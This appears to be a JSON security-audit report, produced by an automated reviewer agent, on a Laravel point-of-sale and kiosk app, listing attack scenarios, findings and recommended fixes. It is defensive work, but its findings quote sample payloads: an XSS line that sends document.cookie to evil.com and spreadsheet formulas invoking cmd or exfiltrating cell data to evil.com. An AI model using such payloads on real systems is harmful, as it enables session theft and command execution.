@@ -1,0 +1,186 @@
+{
+  "agent": "J-ADV-1 Hostile security attacker",
+  "date": "2026-05-24",
+  "scope": "FoodKing Le Cayenne V1 — 12 attack scenarios A1-A12 + frontier sweep",
+  "method": "Static code attack via grep matrix + route×middleware×controller cross-reference + frontier sweep on file uploads, raw SQL, deserialization. Hostile mindset: assume every endpoint is broken until disproved.",
+
+  "scenarios_attacked": [
+    {
+      "id": "A1",
+      "name": "Kiosk customer escalation to admin",
+      "result": "CLEAN",
+      "evidence": "GuestSignupController.php:146 issues Sanctum token with abilities=['kiosk:order'] only (TTL 30d). Kiosk endpoints require tokenCan('kiosk:order') in OrderRequest::authorize + 7 controllers (MenuController:37, UpsellController:32, LoyaltyController:582, PaymentReconcileController:87, etc). Admin endpoints require auth:sanctum + permission:* — narrow-scope token would fail Spatie permission check."
+    },
+    {
+      "id": "A2",
+      "name": "Cashier cross-branch data access",
+      "result": "PARTIAL-CLEAN — see V-02 + V-03 findings",
+      "evidence": "PosOrderController::show:138-146 uses withoutGlobalScope(BranchScope) + explicit post-fetch branch check (single-shape 403 prevents enumeration). PosLoyaltyController::redeem:45-56 same pattern. ComposerProfileController uses authorizeBranchScope. BUT: User model has BranchScope DISABLED (Sanctum recursion guard) — see V-02/V-03 for downstream consequences."
+    },
+    {
+      "id": "A3",
+      "name": "POST /api/admin/pos craft fraudulent order",
+      "result": "CLEAN",
+      "evidence": "OrderRequest.php:148-162 marks subtotal/discount/total as nullable AND backend ignores client values (P9.5.8 comment + GAP-31-1). PricingService::calculateOrder is single source of truth — composition_snapshot built server-side from item_id+option_ids (PricingService:266-291). Negative quantity rejected by 'min:0' validation."
+    },
+    {
+      "id": "A4",
+      "name": "Refund counter-entry cross-branch abuse",
+      "result": "CLEAN",
+      "evidence": "PosOrderController::refundWithCounterEntry:57-61 — defense-in-depth post-middleware: abort(403) if user.branch_id !== order.branch_id + !hasRole(Admin). DB UNIQUE(parent_order_id) catch:82-95 returns 409 MIRROR_ALREADY_EXISTS on double refund (heal A.3 2026-05-19). NF525 boundary enforced via $parent->fiscal_sequence_no IS NULL (RefundWithCounterEntryService:54-56)."
+    },
+    {
+      "id": "A5",
+      "name": "Stripe webhook signature bypass / replay",
+      "result": "CLEAN",
+      "evidence": "Stripe.php:222 calls StripeClient\\Webhook::constructEvent with explicit 300s tolerance (F-3 SYNC P1 heal 2026-05-19). Empty secret => HTTP 500 misconfig (no silent bypass). DB UNIQUE(provider, webhook_id) + firstOrCreate idempotency. Throttle 60/min on /payment/stripe-webhook (Wave 1 P1 SYNC-RED-01) mitigates HMAC-CPU DoS."
+    },
+    {
+      "id": "A6",
+      "name": "Idempotency-Key abuse",
+      "result": "CLEAN",
+      "evidence": "IdempotencyKeyMiddleware.php:76-82 builds key as sha256(getContent()) + scopedKey='idempotency:v1:{branch_id}:{user_id}:sha256(client_key)'. Different payload + same key => 409 IDEMPOTENCY_KEY_CONFLICT. Same payload + same key => cached response replay. Replay-of-other-user impossible (user_id in scope key). Key pattern 8-64 ASCII enforced regex line 61."
+    },
+    {
+      "id": "A7",
+      "name": "Fiscal sequence injection",
+      "result": "CLEAN",
+      "evidence": "Order.php:20-66 $fillable does NOT include fiscal_sequence_no. RefundWithCounterEntryService:124-125 sets $mirror->fiscal_sequence_no = $mirrorSeq via property (not mass-assignment). All sequence allocation paths go through FiscalSequenceService (frozen-zone, Cache::lock + DB FOR UPDATE)."
+    },
+    {
+      "id": "A8",
+      "name": "Audit log dump / DELETE",
+      "result": "CLEAN",
+      "evidence": "Grep zero matches: no AuditLogController exists, no GET routes to /audit-logs in routes/api.php or routes/web.php. Model not exposed via Resource. DB-trigger BEFORE DELETE SIGNAL SQLSTATE '45000' (per CLAUDE.md §8) + GRANT REVOKE (Ansible CVP0-1 f840c3ef5)."
+    },
+    {
+      "id": "A9",
+      "name": "File upload path traversal / RCE",
+      "result": "PARTIAL-CLEAN — see V-05 minor",
+      "evidence": "ItemPhotoUploadRequest.php:17 rules image|mimes:jpg,jpeg,png,webp|max:4096. ItemPhotoController:58 uses Spatie addMediaFromRequest (sanitizes filename to slug). 'image' rule runs getimagesize (rejects pure binary masquerade). Single upload path — no path traversal sink found. mimes-by-extension is slightly weaker than mimetypes-by-magic; flagged P2."
+    },
+    {
+      "id": "A10",
+      "name": "Session fixation",
+      "result": "CLEAN",
+      "evidence": "Sanctum bearer-token auth is stateless — no session_id reuse. config/session.php:21 uses SESSION_DRIVER=file (V1 single-box) — Laravel regenerates session id on login (Auth::guard('web')->loginUsingId triggers regenerate). LoginController:155 also rotates Sanctum tokens on relogin (Sprint 5D Z6-01)."
+    },
+    {
+      "id": "A11",
+      "name": "XSS via item name in pos-wizard",
+      "result": "VULNERABLE — see V-04 KNOWN P0 LOCK PENDING",
+      "evidence": "public/js/pos-wizard.js:1359,1375,1391,1717,1719 concatenate item.name / variation.name into HTML string then wizardEl.innerHTML = h (line 4773). Owner-mandated frozen-zone — XSS LOCK 11+ days pending. KNOWN, tracked. Vue paths (resources/js/) all use {{ }} or v-html with DOMPurify safeHtml()."
+    },
+    {
+      "id": "A12",
+      "name": "CSRF on POS endpoints",
+      "result": "CLEAN",
+      "evidence": "VerifyCsrfToken.php $except only whitelists external payment-provider webhooks (signature-authenticated). routes/web.php (62 lines total) contains only installer + payment-callback POSTs. Admin POSTs land in routes/api.php (Sanctum bearer token, no cookie-based CSRF needed). web group includes VerifyCsrfToken middleware via Kernel.php:43."
+    }
+  ],
+
+  "vulnerabilities_found": [
+    {
+      "id": "ADV1-V01",
+      "severity": "P1",
+      "title": "LOYALTY_QR_ACCEPT_LEGACY_PLAINTEXT defaults to TRUE in production",
+      "endpoint": "POST /api/v1/frontend/loyalty/scan",
+      "file_line": "config/loyalty.php:63 + app/Http/Controllers/Frontend/LoyaltyController.php:657",
+      "exploit_path": "Customer's 8-char loyalty_code is generated via strtoupper(substr(md5(uniqid()),0,8)) — entropy ~36^8=2.8e12 but md5(uniqid) is predictable per microtimestamp. Attacker who knows OR phishes another customer's 8-char code can submit { method:'qr', raw_data:'FK:ABCD1234' } to any kiosk, getting back customer_token + first_name + loyalty_balance. They cannot redeem points (POS-side authorization needed) but they CAN trigger personalized greeting / display PII (first name) on the kiosk screen — privacy leak + UX hijack. Signed-token (lqr.<payload>.<hmac>) path exists (LCS-S-001 heal) but legacy fallback ENABLED by default.",
+      "fix_recommended": "Set LOYALTY_QR_ACCEPT_LEGACY_PLAINTEXT=false in production .env. Default in config/loyalty.php:63 should be env('LOYALTY_QR_ACCEPT_LEGACY_PLAINTEXT', false) — invert the default. Add to AppServiceProvider production boot guard at line 145-ish: refuse to boot if loyalty.qr.accept_legacy_plaintext=true. V1.0.X mobile clients still emitting plaintext QR must migrate to signed tokens.",
+      "verified": "Code-static — observed default true on line 63"
+    },
+    {
+      "id": "ADV1-V02",
+      "severity": "P2 (latent — RBAC misconfig)",
+      "title": "AdministratorController route binding bypasses BranchScope (User model exempt)",
+      "endpoint": "GET/PATCH/DELETE /api/v1/admin/administrator/{administrator}",
+      "file_line": "app/Models/Scopes/BranchScope.php:21-23 + app/Http/Controllers/Admin/AdministratorController.php:75-82",
+      "exploit_path": "BranchScope explicitly returns early when $model instanceof User (Sanctum recursion guard, documented). All AdministratorController endpoints accept route-bound User WITHOUT post-fetch branch check (unlike PosOrderController:138-146 / PosLoyaltyController:45-56 patterns). A user with administrators_show + branch_id>0 could view, edit, delete, change-password any admin record across all branches. CURRENTLY MITIGATED: RolePermissionTableSeeder.php does NOT grant administrators_* to Branch Manager (default seed). EXPLOITABLE IF: Owner manually grants administrators_show to any non-Admin role via Spatie permission UI.",
+      "fix_recommended": "Mirror PosOrderController:138-146 pattern in AdministratorController::show/update/destroy/changePassword/changeImage — add abort_unless(auth user is Admin OR branch matches, 403) after route binding. Same fix for CustomerController (see V-03). Add sentinel test UserBoundControllerBranchGuardSentinelTest covering all 6+ User-bound admin controllers.",
+      "verified": "Code-static + RolePermissionTableSeeder verified administrators_* not granted to BM"
+    },
+    {
+      "id": "ADV1-V03",
+      "severity": "P1 V1.0.X (V1 single-tenant mitigated) / P0 V2 SaaS blocker",
+      "title": "CustomerController route binding bypasses BranchScope (same root cause as V-02)",
+      "endpoint": "GET/PATCH/DELETE /api/v1/admin/customer/{customer}",
+      "file_line": "app/Models/Scopes/BranchScope.php:21-23 + app/Http/Controllers/Admin/CustomerController.php:81-88",
+      "exploit_path": "Same root cause as V-02 (User exempt from BranchScope). Branch Manager (RolePermissionTableSeeder.php:53-57 grants customers_show/_edit/_delete/_create) at branch=5 can call GET /api/v1/admin/customer/show/{any_user_id} and receive full customer record (name, email, phone, country_code, status, addresses via relationships). V1 LOCAL Le Cayenne is single-branch — practical exploit surface=0. V2 SaaS multi-tenant: catastrophic PII cross-tenant leak.",
+      "fix_recommended": "Same as V-02 — add abort_unless cross-branch check in CustomerController::show/update/destroy/changePassword/changeImage. Customer.branch_id semantics: customers ARE branch-scoped because they sign up at a specific kiosk (DefaultAccessService::storeOrUpdate sets branch_id). BUT some customers exist with branch_id=0 (legacy web signups) — fix must allow Admin (branch_id=0) bypass.",
+      "verified": "Code-static + RolePermissionTableSeeder verified BM has customers_show"
+    },
+    {
+      "id": "ADV1-V05",
+      "severity": "P2",
+      "title": "File-upload validation uses mimes (extension-derived) not mimetypes (magic-byte)",
+      "endpoint": "Multiple — ItemPhotoUploadRequest, ChangeImageRequest, SliderRequest, OfferRequest, etc",
+      "file_line": "app/Http/Requests/ItemPhotoUploadRequest.php:17 + 12 other request files",
+      "exploit_path": "Laravel mimes:jpg,jpeg,png checks extension and Symfony MimeTypeGuesser (extension-derived). Combined with 'image' rule (getimagesize) the bypass surface is narrow — polyglot files (valid JPEG + embedded PHP) would still pass image+mimes but be served as image/jpeg by webserver. RCE requires the file to be EXECUTED — Laravel storage/app/public is symlinked to public/ but PHP files in that path are NOT processed if .htaccess/nginx config disables it (verify per deployment). Spatie media-library further sanitizes filename. Overall: low-likelihood RCE, plausible storage-vector path.",
+      "fix_recommended": "V1.0.X — switch image upload requests to mimetypes:image/jpeg,image/png,image/webp (magic-byte). Verify Le Cayenne nginx config explicitly blocks PHP execution under /storage/* and /public/uploads/*. Add stress test uploading 1-byte GIF + JPEG with embedded PHP via .jpg.php double-extension.",
+      "verified": "Code-static across all 14 image upload requests"
+    },
+    {
+      "id": "ADV1-V06",
+      "severity": "P2",
+      "title": "CSV/XLSX formula injection — re-export risk",
+      "endpoint": "POST /api/v1/admin/item/import + /admin/item-category/import",
+      "file_line": "app/Http/Controllers/Admin/ItemController.php:216-224 + ItemCategoryController.php similar",
+      "exploit_path": "Admin uploads XLSX with item names like =DDE(\"cmd\";\"/c calc.exe\";\"!A1\") or =HYPERLINK(\"http://evil.com/?\"&A1,\"Click me\"). Server stores raw name (no sanitization observed). When ItemExport re-generates the XLSX (POST /api/v1/admin/item/export-excel), the formula is preserved. Operator opening the export in Excel triggers formula execution. Low-likelihood for V1 LOCAL (no inbound XLSX from untrusted source — only admin upload).",
+      "fix_recommended": "Prepend single-quote prefix to any cell value starting with =, +, -, @ in ItemExport/CustomerExport/etc. PhpSpreadsheet provides Cell::DATA_TYPE_STRING. Defer V1.0.X.",
+      "verified": "Code-static — observed no sanitization in import/export pipeline"
+    }
+  ],
+
+  "known_issues_confirmed": [
+    {
+      "id": "ADV1-V04 (KNOWN)",
+      "severity": "P0 LOCK 11+ days pending",
+      "title": "pos-wizard.js innerHTML XSS via item.name / variation.name",
+      "file_line": "public/js/pos-wizard.js:1255,1359,1375,1391,1642,1717,1719,3329,4773,4945,4958,4986,4989,5093,5135",
+      "exploit_path": "Admin creates item with name='<img src=x onerror=fetch(`//evil.com/?c=`+document.cookie)>'. Every cashier opening POS V4 wizard for that item executes JS in their session context. Frozen-zone (CLAUDE.md §7 — POS Vanilla JS wizard). LOCK plan pending owner countersign 11+ days per memory.",
+      "status": "LOCK plan exists, not yet executed. Owner mandate per CLAUDE.md §7."
+    },
+    {
+      "id": "FormRequest authz baseline 66/69",
+      "severity": "tracked V1.0.2 BACKLOG",
+      "file_line": "FormRequestAuthzDriftSentinelTest baseline=69, current count=66",
+      "status": "Per CLAUDE.md §9 sentinel — ratchet baseline to 66 in V1.0.2."
+    },
+    {
+      "id": "BranchScope EXEMPTED_MODELS baseline (10 models)",
+      "severity": "tracked V1.0.2 BACKLOG (single-tenant V1 low risk)",
+      "file_line": "BranchScopeCoverageSentinelTest EXEMPTED_MODELS",
+      "status": "FrontendDiningTable, ZReport, AuditLog, OrderDiscountLog, Message, DiningTableAuditLog, KioskPromo, UpsellRule, ActionLog, DomainEvent — V2 SaaS hard-fail."
+    },
+    {
+      "id": "UNI-03 cache driver guard narrow",
+      "severity": "tracked V1.0.X cloud-prep",
+      "file_line": "AppServiceProvider.php:215 — block list [array, null] only; file/database PASS",
+      "status": "V1 LOCAL Le Cayenne file driver safe; ALB multi-instance requires widening. Defer cloud cutover prep."
+    }
+  ],
+
+  "scenarios_clean": [
+    "A1 kiosk→admin escalation (ability scope)",
+    "A3 POST /api/admin/pos forged order (server SSOT)",
+    "A4 refund counter-entry abuse (defense-in-depth + UNIQUE constraint)",
+    "A5 Stripe webhook signature/replay (300s tolerance + DB UNIQUE)",
+    "A6 Idempotency-Key abuse (sha256+branch+user scoping)",
+    "A7 fiscal_sequence_no injection (NOT fillable + service-only allocation)",
+    "A8 audit log dump (no controller, DB trigger)",
+    "A10 session fixation (Sanctum stateless + token rotation)",
+    "A12 CSRF (whitelist limited to signature-auth webhooks)"
+  ],
+
+  "verdict": "AMBER",
+  "verdict_reasoning": "V1 LOCAL Le Cayenne SHIPS — no NEW P0 surface attack. P0-level known issue (ADV1-V04 pos-wizard XSS) is a frozen-zone LOCK pending owner countersign per CLAUDE.md §7, not a Phase-J regression. NEW findings = 1 P1 (loyalty plaintext QR default), 2 P2 (User-bound IDOR latent in single-tenant), 2 P2 (file upload + formula injection — defer V1.0.X). Production boot guards (AppServiceProvider:78-145) firmly block POS_SIMULATION_HARDWARE, APP_DEBUG, IDEMPOTENCY bypass — these are excellent. Stripe + idempotency + refund + NF525 chain are production-grade. Verdict AMBER because V-01 should flip default for production cleanliness even though current exploit is privacy-leak class not financial-loss class.",
+
+  "top_5_for_owner_priority": [
+    "1. ADV1-V01 (P1) — flip LOYALTY_QR_ACCEPT_LEGACY_PLAINTEXT default to false + add boot guard. ~30 min fix.",
+    "2. ADV1-V04 (KNOWN P0) — execute pending pos-wizard XSS LOCK. Frozen-zone owner gate required.",
+    "3. ADV1-V03 (P1 V1.0.X / P0 V2) — add abort_unless cross-branch check in CustomerController + AdministratorController + 4 sibling User-bound controllers. Add sentinel UserBoundControllerBranchGuardSentinelTest. ~2h fix.",
+    "4. ADV1-V05 (P2) — migrate image upload requests from mimes: to mimetypes: + verify nginx PHP-disable in storage paths. V1.0.X.",
+    "5. ADV1-V06 (P2) — sanitize Excel export cells (single-quote prefix for =+-@). V1.0.X."
+  ]
+}
